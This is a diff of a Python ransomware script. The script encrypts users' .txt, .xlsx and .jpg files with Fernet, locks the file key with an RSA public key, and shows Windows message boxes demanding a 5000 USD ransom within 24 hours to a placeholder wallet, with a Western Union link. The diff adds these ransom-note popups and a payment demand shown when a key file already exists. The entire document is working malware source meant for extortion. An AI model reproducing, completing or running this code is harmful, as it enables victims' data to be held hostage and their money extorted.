@@ -1,9 +1,10 @@
+from ctypes.wintypes import UINT
 import os
-import string
+import sys
 import rsa
 from cryptography.fernet import Fernet
-
-
+import ctypes
+MessageBox = ctypes.windll.user32.MessageBoxW
 # File extensions to encrypt
 def extensions(ext):
     return set(ext)
@@ -25,9 +26,13 @@ def load_key():
 
 def generate_file_key():
     key = Fernet.generate_key()
-    with open('keys\\files_key.key', 'wb') as f:
-        f.write(key)
-    return key
+    if os.path.exists('keys\\files_key.key'):
+        MessageBox(0, 'Your files are encrypted. Pay the ransom.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ERROR', 1)
+        sys.exit(1)
+    else:
+        with open('keys\\files_key.key', 'wb') as f:
+            f.write(key)
+        return key
 
 def encrypt_files(paths, key):
     for file_path in paths:
@@ -39,8 +44,8 @@ def encrypt_files(paths, key):
                 f.write(encrypted)
 
 def encrypt_key(pubKey):
-    with open('keys\\pubKey.pem', mode='rb') as pk_file:
-        f = open("keys\\files_key.key", 'rb')
+    with open('keys\\pubKey.pem', mode='rb'):
+        f = open("keys\\files_key.key", mode='rb')
         fernet_key = f.read()
         f.close()
 
@@ -48,7 +53,9 @@ def encrypt_key(pubKey):
 
         f = open("keys\\files_key.key", 'wb')
         f.write(bytearray(encrypted_fernet_key))
-        f.close()
+        f.close()    
+        
+
 
 def main():
     encrypted_ext = extensions(('.txt', '.xlsx', '.jpg'))
@@ -58,7 +65,7 @@ def main():
     encrypt_files(paths, file_key)
     rsa_key = load_key()
     encrypt_key(rsa_key)
-    print("FUISTE ENCRIPTADO CAPO")
+    MessageBox(0, 'The files in your computer have been encrypted. \nIf you want to restore them, you must pay a ransom of 5000 USD  to the next Wallet in less than 24hs.\nYou can follow the steps in the following Link:\nhttps://www.westernunion.com/fr/en/mobile-wallet.html\nOnce the money is delivered, we will give you the information needed to recover your files.\nWallet:\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', 'ALERT: YOU HAVE BEEN HACKED', 1)
 
 if __name__ == "__main__":
     main()
